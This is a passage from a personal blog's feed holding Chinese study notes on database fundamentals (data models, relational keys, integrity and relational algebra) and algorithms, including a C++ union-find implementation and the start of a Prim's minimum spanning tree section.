    <entry>
      <title>数据库</title>
      <link href="/2023/11/17/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A0/"/>
      <url>/2023/11/17/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<blockquote><p>这里主要是复习的时候听着网课重新做一遍笔记。</p></blockquote><h1 id="绪论"><a class="markdownIt-Anchor" href="#绪论">#</a> 绪论</h1><h2 id="介绍"><a class="markdownIt-Anchor" href="#介绍">#</a> 介绍</h2><h3 id="数据库系统概述"><a class="markdownIt-Anchor" href="#数据库系统概述">#</a> 数据库系统概述</h3><h4 id="数据"><a class="markdownIt-Anchor" href="#数据">#</a> 数据</h4><p>数据是数据库中存储的基本对象。<br><strong>[定义]</strong> 计算机用来描述事物的符号记录（文字．图形．图像．声音）</p><ul><li>数据的形式本身并不能完全表达其内容，需要经过语义解释。数据与其语义是不可分的</li></ul><h4 id="数据库-db"><a class="markdownIt-Anchor" href="#数据库-db">#</a> 数据库 DB</h4><ul><li>数据库是长期存储在计算机内有结构的大量的共享的数据集合。</li></ul><h4 id="数据库管理系统-dbms"><a class="markdownIt-Anchor" href="#数据库管理系统-dbms">#</a> 数据库管理系统 DBMS</h4><p><strong>[定义]</strong> 数据库管理系统是位于用户与操作系统之间的一层数据管理软件。<br><strong>主要功能：</strong></p><ul><li>数据定义功能</li><li>数据组织，存储和管理功能</li><li>数据操纵功能（插入，查询，删除，修改等）</li><li>数据库的事务管理和运行管理（安全性，完整性，多用户并发处理）</li><li>数据库的建立和维护功能</li></ul><h4 id="数据库系统-dbs"><a class="markdownIt-Anchor" href="#数据库系统-dbs">#</a> 数据库系统 DBS</h4><p><strong>[定义]</strong> 数据库系统由数据库（DB），数据库管理系统（DBMS），应用系统，数据库管理员（DBA）构成。<br><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/%E7%BB%AA%E8%AE%BA1.png?raw=true" alt="绪论1"></p><h3 id="数据管理技术的发展"><a class="markdownIt-Anchor" href="#数据管理技术的发展">#</a> 数据管理技术的发展</h3><p><strong>一，人工管理阶段</strong></p><ul><li>数据不保存</li><li>数据不共享</li><li>应用程序管理数据</li><li>数据不独立<br><strong>二，文件系统阶段</strong></li><li>数据保存</li><li>文件系统管理数据</li><li>数据共享差，冗余大</li><li>数据独立性差<br><strong>三，数据库系统阶段</strong></li><li>数据结构化</li><li>数据共享性高，冗余度低，易扩充</li><li>数据独立性高</li><li>数据由 DBMS 同一管理和控制：安全，完整，并发，恢复</li></ul><h2 id="数据模型"><a class="markdownIt-Anchor" href="#数据模型">#</a> 数据模型</h2><p><strong>[定义]</strong> 一组概念的集合，对现实世界数据特征进行抽象。</p><ul><li><strong>概念模型</strong> ： 按照用户观点建模，用于数据库设计</li><li><strong>逻辑和物理模型</strong></li></ul><blockquote><p><strong>逻辑模型</strong>：按计算机系统观点对数据建模， 用于 DBMS 的实现。主要包括：层次模型，网状模型，关系模型（二维表的数据库），面向对象模型和对象关系模型。<br><strong>物理模型</strong>：系统内部或磁盘上表示方式、存取方法，面向计算机系统。其是对数据最底层的抽象</p></blockquote><h4 id="数据模型的组成元素"><a class="markdownIt-Anchor" href="#数据模型的组成元素">#</a> 数据模型的组成元素</h4><p><strong>一，数据结构</strong><br>描述数据库的组成对象，以及对象之间的联系。数据结构是所描述的对象类型的集合，是对系统静态特性的描述。<br><strong>二，数据操作</strong><br>数据库主要有查询和更新（包括插入，删除，修改等），两大类操作。是对系统动态特性的描述。<br><strong>三，数据的完整性约束条件</strong><br>数据的完整性约束条件是一组完整性规则。<br>【例】 关系模型中，任何的关系必须满足实体完整性和参照完整性。</p><h4 id="概念模型"><a class="markdownIt-Anchor" href="#概念模型">#</a> 概念模型</h4><p><strong>定义：</strong></p><ul><li>概念模型用于信息世界的建模</li><li>现实世界到信息世界的第一层抽象</li><li>数据库设计人员进行数据库设计的有力工具</li><li>数据库设计人员和用户之间进行交流的语言<br><strong>概念模型要求：</strong></li><li>具有较强的语义表达能力</li><li>能够方便，直接的表达应用中的各种语义知识</li><li>简单，清晰，易于用户理解<br><strong>一，信息世界中的基本概念</strong><br><strong> 1，实体 Entity</strong><br> 客观存在并且可以相互去别的事务即实体。可以是人，事，物，也可以是抽象的概念或者联系。<br>【例】 一个职工，学生，部门，课等都是实体<br><strong> 2，属性</strong><br>实体所具有的某一特性称为属性。一个实体可以由若干个属性来刻画。<br>【例】学生的 学号，姓名 等<br><strong> 3，码 key</strong><br> 唯一标识实体的属性集称为码。<br><strong>4，域</strong><br>具有相同数据类型的值的集合。即属性的取值范围。<br><strong>5，实体型</strong><br>具有相同属性的实体必然具有共同的特征和性质。<br><strong>6，实体集</strong><br>同一类型实体的集合称为实体集。<br><strong>7，联系</strong><br>现实世界中，事务内部以及事物之间是有联系的。实体内部各个属性的联系或者不同实体集之间的联系。<br><strong>二，两个实体型之间的联系</strong><br><strong> 1，一对一</strong><br>对于 A 中的每一个实体，B 中至多有一个（可以没有）实体与之联系，反之亦然。<br>【例】一个班级只有一个班长<br><strong> 2，一对多</strong><br> A 中的一个实体，B 中有 n 歌实体与之联系，但是 B 中每一个实体在 A 中最多只有一个实体联系。<br>【例】一个班级有若干名学生，学生之恶能在一个班级学习。<br><strong>3，多对多</strong><br> A 中的每一个实体，B 中有多个，反之也是一样。</li></ul><h3 id="数据库系统结构"><a class="markdownIt-Anchor" href="#数据库系统结构">#</a> 数据库系统结构</h3><h4 id="数据库系统模式概念"><a class="markdownIt-Anchor" href="#数据库系统模式概念">#</a> 数据库系统模式概念</h4><ul><li>模式：是数据库中全体数据得逻辑结构和特征得描述，同一个模式可以有多个实例。</li><li>外模式：数据库用户能看见和使用得局部数据得逻辑结构和特征得描述，是数据库用户得数据视图，与某一应用有关的数据的逻辑表示。</li><li>内模式：也称存储模式，是数据物理结构和存储方式的描述，是数据在数据库内部的组织方式。<br>模式 / 内模式有映像：保证数据与程序的逻辑独立性<br>外模式 / 模式有映像：定义全局逻辑结构和存储结构之间的对应关系，保证数据和程序的物理独立性</li></ul><h1 id="关系数据库"><a class="markdownIt-Anchor" href="#关系数据库">#</a> 关系数据库</h1><h3 id="关系"><a class="markdownIt-Anchor" href="#关系">#</a> 关系</h3><p>单一的数据结构 — 关系<br>逻辑结构 — 二维表<br><strong>关系模型是建立在集合代数的基础上的</strong></p><h4 id="概念"><a class="markdownIt-Anchor" href="#概念">#</a> 概念</h4><p><strong>1，域</strong><br>具有相同数据类型的值的集合。即属性的取值范围。<br><strong>2，笛卡尔积</strong><br>给定一组域<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>D</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">D_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> , <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>D</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">D_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> , <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>D</mi><mn>3</mn></msub></mrow><annotation encoding="application/x-tex">D_3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>, <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>D</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">D_n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> , 这些域的笛卡尔积为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>D</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">D_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>  × <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>D</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">D_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> ×…× <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>D</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">D_n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> =<ruby>($d_1$,$d_2$,…,$d_n$)|$d_i$∈$D_i$,i=1,2,3,…,n} **3, 元组 **笛卡尔积中每一个元素乘坐一个 n 元组。表的每一行叫做一个元组。**4，分量 **元素中每一个值 $d_i$ 称做一个分量。**5，基数 **若 $D_i$ 为有限集，其基数为 $m_i$，则 $D_1$ × $D_2$ … $D_n$ 的基数为 M = $\prod_{i=1}<rp>【</rp><rt>{n</rt><rp>】</rp></ruby>$$m_i$</p><h4 id="码"><a class="markdownIt-Anchor" href="#码">#</a> 码</h4><ul><li>候选码：若关系中的某一属性组能唯一标识一个元组，则称该属性组为候选码。</li><li>全码（ALL-key）：最极端的情况，关系模式的所有属性共同构成这个关系模式的候选码，称为全码。</li><li>主码：若一个关系有多个候选码，则选定一个作为主码（Primary key）。</li><li>主属性：候选码的诸个属性称为主属性</li><li>非主属性：不包含在任何候选码中的属性 （或者说非码属性）。</li></ul><h4 id="三类关系"><a class="markdownIt-Anchor" href="#三类关系">#</a> 三类关系</h4><ul><li>基本关系 (基本表)：实际存在的表，是实际存储数据的逻辑表示</li><li>查询表：查询结果对应的表</li><li>视图表：有基本表或者其他视图表导出的表，是虚表，不对应实际存储的数据。</li></ul><h4 id="关系模式"><a class="markdownIt-Anchor" href="#关系模式">#</a> 关系模式</h4><p>【定义】 是对关系的描述。关系模式是型，关系是值。 关系模式是静态的。<br>关系的形式化表示：R (U, D, dom, F)  R：关系名  U：组成该关系的属性集合  DOM：属性项域的映像集合 F：属性间的数据依赖关系集合</p><h4 id="关系数据库-2"><a class="markdownIt-Anchor" href="#关系数据库-2">#</a> 关系数据库</h4><p>一个给定的应用领域中，所有关系的集合构成一个关系数据库。</p><h3 id="关系的完整性"><a class="markdownIt-Anchor" href="#关系的完整性">#</a> 关系的完整性</h3><p><strong>关系模型中有三类完整性约束：实体完整性，参照完整性，用户定义的完整性。</strong></p><h4 id="实体完整性"><a class="markdownIt-Anchor" href="#实体完整性">#</a> 实体完整性</h4><p>是指若属性 A 是基本关系 R 的主属性，则 A 不能取空值。<br><strong>实体完整性规则的说明:</strong><br>（1）主码不能为空值。（所有的主属性都不能取空值）<br>（2）两个元素的主码不能相同。</p><h4 id="参照完整性"><a class="markdownIt-Anchor" href="#参照完整性">#</a> 参照完整性</h4><p>这里介绍一下<strong>外码</strong>。<br>定义：设 F 是基本关系 R 的一个或一组属性，但不是关系 R 的码。如果 F 与基本关系 S 的主码<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>K</mi><mi>s</mi></msub></mrow><annotation encoding="application/x-tex">K_s</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">s</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 相对应，则称 F 是基本关系 S 的外码。 基本关系 R 为参照关系，基本关系 S 为被参照关系。<br><strong>参照完整性规则：</strong><br>对于 R 上每个元组在 F 上的取值：要么取控制，要么等于 S 中某个元组的主码值。</p><h4 id="用户定义的完整性"><a class="markdownIt-Anchor" href="#用户定义的完整性">#</a> 用户定义的完整性</h4><p>这里就是自己对数据加上域，添加约束。</p><h3 id="关系代数"><a class="markdownIt-Anchor" href="#关系代数">#</a> 关系代数</h3><h4 id="传统的集合运算"><a class="markdownIt-Anchor" href="#传统的集合运算">#</a> 传统的集合运算</h4><p>注意这里默认 R 和 S 都有相同的目 n（都具有 n 个属性）<br><strong>1，并 (union)</strong><br> R 并 S，即在 R 也在 S 的元素集合<br><strong> 2，差 (expect)</strong><br> R 差 S，在 R 中而不在 S 中的元素的集合<br><strong> 3，交 (intersection)</strong><br> R 交 S，既属于 R 又属于 S 的元组组成。<br><strong>4，笛卡尔积</strong><br> R：n 目，k 个元组   S：m 目，t 个元组<br> R X S ：结果 行: k × t 个元组 列: (n+m) 个列</p><h4 id="专门的关系运算"><a class="markdownIt-Anchor" href="#专门的关系运算">#</a> 专门的关系运算</h4><p><strong>1，选择</strong><br>通过条件筛选来查询相应数据。例如<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>σ</mi><mrow><mi>s</mi><mi>a</mi><mi>g</mi><mi>e</mi><mo>&lt;</mo><mn>20</mn></mrow></msub></mrow><annotation encoding="application/x-tex">σ_{sage&lt;20}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.716668em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">s</span><span class="mord mathnormal mtight">a</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">g</span><span class="mord mathnormal mtight">e</span><span class="mrel mtight">&lt;</span><span class="mord mtight">2</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>(student) 表示查询年龄小于 20 的学生。<br><strong>2，投影运算</strong><br>只从关系 R 中选取若干属性组成新的关系。例如<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>π</mi><mrow><mi>s</mi><mi>n</mi><mi>a</mi><mi>m</mi><mi>e</mi><mo separator="true">,</mo><mi>s</mi><mi>d</mi><mi>e</mi><mi>p</mi><mi>t</mi></mrow></msub></mrow><annotation encoding="application/x-tex">\pi_{sname,sdept}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.716668em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">π</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361079999999999em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">s</span><span class="mord mathnormal mtight">n</span><span class="mord mathnormal mtight">a</span><span class="mord mathnormal mtight">m</span><span class="mord mathnormal mtight">e</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight">s</span><span class="mord mathnormal mtight">d</span><span class="mord mathnormal mtight">e</span><span class="mord mathnormal mtight">p</span><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>，是只查询学生的姓名和所在系。<br><strong>3，连接运算</strong><br> R 和 S 进行连接运算的结果：从 R 和 S 的广义笛卡尔积 R × S 中选取 (R 关系) 在 A 属性组上的值与（S 关系）在 B 属性组上值满足关系 θ 的元组。</p><ul><li>等值连接：从关系 R 和 S 的广义笛卡尔积中找到 A 和 B 属性相等的那些元组。（A 和 B 可以不是同一个属性）</li><li>自然连接：是一种特殊的等值连接，R 和 S 中具有相同属性组 B，在结果结果中把重复的属性列去掉。<br><strong>4，除运算</strong><br>这里先给出<strong>象集</strong>的定义：当在 R 关系中属性 A 取 x 值时，其他属性例如 B 可以取什么值，这个取得值得集合称为 1 象集。<br>R÷S={tr [X]| tr∈R 并且<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>π</mi><mi>y</mi></msub></mrow><annotation encoding="application/x-tex">\pi_y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.716668em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">π</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>(S)<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⊆</mo></mrow><annotation encoding="application/x-tex">\subseteq</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7719400000000001em;vertical-align:-0.13597em;"></span><span class="mrel">⊆</span></span></span></span> Yx}<br> 那么 R 除 S，假设 R 中 得 B,C 属性 是 R 和 S 共同属性，那么就找 A 中哪个 A 得元素得象集能包含 S 中所有得 B，C 得取值得。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 课程笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>算法学习</title>
      <link href="/2023/11/15/%E5%9F%BA%E7%A1%80%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0/"/>
      <url>/2023/11/15/%E5%9F%BA%E7%A1%80%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>这里更新主要更新一些 模板 / 数据结构 /… 的题目吧</p><h3 id="并查集"><a class="markdownIt-Anchor" href="#并查集">#</a> 并查集</h3><p>【定义】：用来管理元素分组情况的数据结构。并查集可以高效的进行如下操作：</p><ul><li>查询元素 a 和元素 b 是否属于同一组</li><li>合并元素 a 和 b 所在的组<br><strong>需要注意并查集只能进行合并操作，但是无法进行分割操作</strong><br>【结构】：并查集是利用树形结构实现的。不过不是二叉树。<br>（1）初始化：<br>首先准备 n 个节点代表 n 个元素。最开始没有边。<br><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/screenshot(1).png?raw=true" alt="初始化"><br>（2）合并：<br>如图，从一个组的根向另一个组的根连边，这样两棵树变成一颗树，也就把两个组合合并为一个组。<br><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/screenshot(2).png?raw=true" alt="合并"><br>（3）查询：<br>为了查询两个节点是否属于同一组，需要沿着树向上走，来查询包含这个元素的根是谁。两个节点走到同一个根，则说明他们属于同一组。下图 5，2 走到 1，7 走到 6，所以 7 和 2，5 不是同一组。<br><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/screenshot.png?raw=true" alt="查询"><br><strong>并查集实现中注意的点：</strong><br>避免退化！</li><li>对于每颗树，记录这棵树的高度（rank）</li><li>合并时如果两棵树的 rank 不同，则 rank 小的向 rank 大的连边。<br>此外，通过路径压缩，可以使并查集更高效。对每个节点，一旦走到了一次根节点，就把这个点到父亲的边改为直连连向根。如图<br><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/screensho1.png?raw=true" alt="路径压缩"></li></ul><p><strong>这里给出并查集的实现</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> par[MAX_N]; <span class="comment">//父亲</span></span><br><span class="line"><span class="type">int</span> rank[MAX_N]; <span class="comment">//树的高度</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化n个元素</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">(<span class="type">int</span> n)</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">par[i] = i;</span><br><span class="line">rank[i] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//查询树的根</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">find</span><span class="params">(<span class="type">int</span> x)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(par[x] == x)&#123;</span><br><span class="line"><span class="keyword">return</span> x;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> par[x] = <span class="built_in">find</span>(par[x]); <span class="comment">//路径压缩</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 合并x和y所属的集合</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">unite</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> y)</span></span>&#123;</span><br><span class="line">x = <span class="built_in">find</span>(x);</span><br><span class="line">y = <span class="built_in">find</span>(y);</span><br><span class="line"><span class="keyword">if</span>(x == y) <span class="keyword">return</span>;</span><br><span class="line"><span class="keyword">if</span>(rank[x] &lt; rank[y])&#123;</span><br><span class="line">par[x] = y;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">par[y] = x;</span><br><span class="line"><span class="keyword">if</span> (rank[x] == rank[y]) rank[x]++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 判断 x 和 y 是否属于同一个集合</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">same</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">find</span>(x) == <span class="built_in">find</span>(y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="最小生成树"><a class="markdownIt-Anchor" href="#最小生成树">#</a> 最小生成树</h2><p>再来复习一下最小生成树吧   ：）<br>【生成树定义】给定一个无向图，如果它的某一个子图中任意两个顶点都相互连通并且是一棵树，那莪这棵树就叫做生成树。如果边上有权值，那么使得边权和最小的生成树是最小生成树。<br>【应用例题】：<br><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/screenshot(3).png?raw=true" alt="例题示例"></p><h4 id="算法1prim算法"><a class="markdownIt-Anchor" href="#算法1prim算法">#</a> 算法 1（Prim 算法）</h4><p>首先，我们假设有一颗只包含一个点 v 的树 T。然后贪心选取 T 和其他顶点之间相连的最小权值的边，并把它加到 T 中。不断进行这个操作，即可获得一个生成树。下面来证明：<br>我们令 V 表示顶的集合。假设现在已经求得的生成树的顶点的集合是 X（<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⊂</mo></mrow><annotation encoding="application/x-tex">\subset</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">⊂</span></span></span></span> V）, 并且存在在 V 上的最小生成树使得 T 是它的一个子图。下面我们证明存在一棵最小生成树使得 T 是它的一个子图并且它包含了连接 X 和 V\X 的权值最小的边。记连接 X 和 V\X 的权值最小的边为 e，它连接着 V（∈X）和 u (∈V \ X)。 根据假设，存在一颗 V 上的最小生成树使得 T 是它的一个子图。如果 e 也在这棵最小生成树上，问题就得到证明了，所以我们假设 e 不再这棵书上。因为生成树的本质是一棵树，所以在添加了 e 之后就形成了圈。<br>算了，抄别人的证明太难受了，我说一下自己的想法吧，虽然可能很潦草还有错误但是能理解就行：就是一个无向图，那我们随机取一个点，找这个点所能连的最小的边（为什么能随机取，因为任意一个点所连的最小边一定要取，满足贪心），如果选的最小边会使生成树产生环，则取次小边，直到所有点都被取到。<br>那直接根据我的定义上代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 